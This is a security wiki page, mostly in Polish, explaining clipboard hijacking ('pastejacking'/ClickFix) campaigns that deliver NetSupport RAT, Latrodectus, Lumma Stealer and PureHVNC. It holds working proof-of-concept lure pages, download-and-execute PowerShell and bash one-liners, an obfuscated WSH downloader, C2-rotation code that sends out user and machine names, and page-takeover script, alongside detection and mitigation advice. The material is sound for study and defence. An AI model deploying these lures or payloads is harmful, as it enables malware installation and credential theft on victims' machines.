# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Nigdy nie wklejaj niczego, czego sam nie skopiowałeś." – stare, ale nadal aktualne zalecenie

## Przegląd

Clipboard hijacking – also known as *pastejacking* – wykorzystuje fakt, że użytkownicy rutynowo kopiują i wklejają polecenia, nie sprawdzając ich. Złośliwa strona WWW (albo dowolny kontekst obsługujący JavaScript, np. aplikacja Electron lub Desktop) programowo umieszcza w schowku systemowym tekst kontrolowany przez atakującego. Ofiary są zwykle zachęcane, za pomocą starannie przygotowanych instrukcji socjotechnicznych, do naciśnięcia **Win + R** (okno Uruchom), **Win + X** (Szybki dostęp / PowerShell) lub otwarcia terminala i *wklejenia* zawartości schowka, co powoduje natychmiastowe wykonanie dowolnych poleceń.

Ponieważ **żaden plik nie jest pobierany i żaden załącznik nie jest otwierany**, technika omija większość kontroli bezpieczeństwa poczty e-mail i treści WWW, które monitorują załączniki, makra lub bezpośrednie wykonywanie poleceń. W związku z tym atak jest popularny w kampaniach phishingowych dostarczających powszechne rodziny malware, takie jak NetSupport RAT, Latrodectus loader czy Lumma Stealer.

## JavaScript Dowód koncepcji (PoC)
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Starsze kampanie używały `document.execCommand('copy')`, nowsze polegają na asynchronicznym **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. Użytkownik odwiedza typosquatted lub skompromitowaną stronę (np. `docusign.sa[.]com`)
2. Wstrzyknięty JavaScript **ClearFake** wywołuje pomocnik `unsecuredCopyToClipboard()`, który cicho zapisuje Base64-encoded PowerShell one-liner do schowka.
3. Instrukcje HTML informują ofiarę: *“Naciśnij **Win + R**, wklej polecenie i naciśnij Enter, aby rozwiązać problem.”*
4. Uruchamiany jest `powershell.exe`, który pobiera archiwum zawierające legalny plik wykonywalny oraz złośliwy DLL (klasyczny DLL sideloading).
5. Ładowacz odszyfrowuje dodatkowe etapy, wstrzykuje shellcode i instaluje persistence (np. scheduled task) – ostatecznie uruchamiając NetSupport RAT / Latrodectus / Lumma Stealer.

### Przykład łańcucha NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legalny Java WebStart) przeszukuje swój katalog w poszukiwaniu `msvcp140.dll`.
* Złośliwy DLL dynamicznie rozwiązuje odwołania do API za pomocą **GetProcAddress**, pobiera dwa pliki binarne (`data_3.bin`, `data_4.bin`) za pomocą **curl.exe**, odszyfrowuje je, używając rolling XOR key `"https://google.com/"`, wstrzykuje finalny shellcode i rozpakowuje **client32.exe** (NetSupport RAT) do `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Pobiera `la.txt` za pomocą **curl.exe**
2. Uruchamia downloader JScript wewnątrz **cscript.exe**
3. Pobiera MSI payload → umieszcza `libcef.dll` obok podpisanej aplikacji → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer przez MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Wywołanie **mshta** uruchamia ukryty skrypt PowerShell, który pobiera `PartyContinued.exe`, rozpakowuje `Boat.pst` (CAB), rekonstruuje `AutoIt3.exe` przy użyciu `extrac32` i konkatenacji plików, a na końcu uruchamia skrypt `.a3x`, który eksfiltruje poświadczenia przeglądarki do `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Niektóre kampanie ClickFix całkowicie pomijają pobieranie plików i nakłaniają ofiary do wklejenia one-linera, który pobiera i wykonuje JavaScript przez WSH, utrwala go i codziennie zmienia C2. Zaobserwowany przykładowy łańcuch:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Kluczowe cechy
- Zobfuskowany URL odwracany w czasie wykonywania, aby utrudnić powierzchowną inspekcję.
- JavaScript utrzymuje swoją obecność poprzez Startup LNK (WScript/CScript) i wybiera C2 według bieżącego dnia – umożliwiając szybką domain rotation.

Minimalny fragment JS używany do rotacji C2 według daty:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Następny etap często wdraża loader, który ustanawia persistence i pobiera RAT (np. PureHVNC), często przypinając TLS do zaszytego certyfikatu i dzieląc ruch na fragmenty.

Detection ideas specific to this variant
- Drzewo procesów: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (lub `cscript.exe`).
- Artefakty autostartu: LNK w `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` wywołujący WScript/CScript z ścieżką JS pod `%TEMP%`/`%APPDATA%`.
- Rejestr/RunMRU i telemetria linii poleceń zawierająca `.split('').reverse().join('')` lub `eval(a.responseText)`.
- Powtarzające się `powershell -NoProfile -NonInteractive -Command -` z dużymi stdin payloadami do podawania długich skryptów bez długich linii poleceń.
- Scheduled Tasks, które następnie uruchamiają LOLBins, takie jak `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` w zadaniu/ścieżce wyglądającej na updater (np. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Codziennie rotujące nazwy hostów C2 i URL-e z wzorcem `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Korelować zdarzenia zapisu do schowka, po których następuje wklejenie przez Win+R, a potem natychmiastowe uruchomienie `powershell.exe`.

Blue-teams mogą połączyć telemetrię schowka, tworzenia procesów i rejestru, aby zlokalizować nadużycie pastejackingu:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` przechowuje historię poleceń **Win + R** – szukaj nietypowych wpisów Base64 / zaciemnionych.
* Security Event ID **4688** (Process Creation) gdzie `ParentImage` == `explorer.exe` i `NewProcessName` w { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** dla tworzeń plików pod `%LocalAppData%\Microsoft\Windows\WinX\` lub w folderach tymczasowych tuż przed podejrzanym zdarzeniem 4688.
* EDR clipboard sensors (jeśli obecne) – korelować `Clipboard Write` bezpośrednio poprzedzające nowy proces PowerShell.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Najnowsze kampanie masowo tworzą fałszywe strony weryfikacyjne CDN/przeglądarki ("Just a moment…", IUAM-style), które zmuszają użytkowników do skopiowania z schowka poleceń specyficznych dla systemu operacyjnego do natywnych konsol. To przenosi wykonanie poza sandbox przeglądarki i działa zarówno na Windows, jak i macOS.

Key traits of the builder-generated pages
- Wykrywanie OS przez `navigator.userAgent`, żeby dopasować payloady (Windows PowerShell/CMD vs. macOS Terminal). Opcjonalne decoys/no-ops dla nieobsługiwanych OS, aby utrzymać iluzję.
- Automatyczne kopiowanie do schowka przy pozornie nieszkodliwych akcjach UI (checkbox/Copy), podczas gdy widoczny tekst może różnić się od zawartości schowka.
- Blokowanie urządzeń mobilnych i popover z instrukcjami krok po kroku: Windows → Win+R→wklej→Enter; macOS → otwórz Terminal→wklej→Enter.
- Opcjonalne zaciemnianie i single-file injector do nadpisania DOM kompromitowanej strony interfejsem w stylu Tailwind (nie jest wymagana rejestracja nowej domeny).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS - utrwalenie po pierwszym uruchomieniu
- Użyj `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` aby wykonanie kontynuowało się po zamknięciu terminala, zmniejszając widoczne artefakty.

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: strony, które wiążą Clipboard API z widgetami weryfikacyjnymi; niezgodność między wyświetlanym tekstem a zawartością schowka; `navigator.userAgent` branching; Tailwind + single-page replace w podejrzanych kontekstach.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` wkrótce po interakcji z przeglądarką; instalatory batch/MSI uruchamiane z `%TEMP%`.
- macOS endpoint: Terminal/iTerm uruchamiające `bash`/`curl`/`base64 -d` z `nohup` w pobliżu zdarzeń przeglądarki; zadania w tle przetrwające zamknięcie terminala.
- Skoreluj historię `RunMRU` (Win+R) i zapisy w schowku z późniejszym tworzeniem procesów konsoli.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mitigations

1. Browser hardening – wyłącz zapis do schowka (`dom.events.asyncClipboard.clipboardItem` itd.) lub wymuś gest użytkownika.
2. Security awareness – ucz użytkowników, aby *wpisywali* wrażliwe polecenia lub najpierw wklejali je do edytora tekstu.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control, aby zablokować dowolne one-liners.
4. Network controls – blokuj ruch wychodzący do znanych domen pastejacking i domen C2 malware.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
